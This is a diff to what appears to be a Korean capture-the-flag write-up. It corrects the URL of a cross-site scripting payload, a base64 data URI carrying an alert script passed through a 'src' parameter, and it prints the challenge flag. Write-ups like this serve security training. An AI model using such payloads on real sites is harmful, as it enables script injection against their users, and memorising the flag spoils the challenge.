@@ -17,7 +17,7 @@ Data URI로 변환된 파일을 포함하면 페이지가 로딩 된 이후 이�
 
 <script>alert(“XSS”);</script>
 
-<your_ip_address>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCjigJxYU1PigJ0pOzwvc2NyaXB0Pg==
+<your_ip_address>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCjigJxYU1PigJ0pOzwvc2NyaXB0Pg==
 
 THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
 
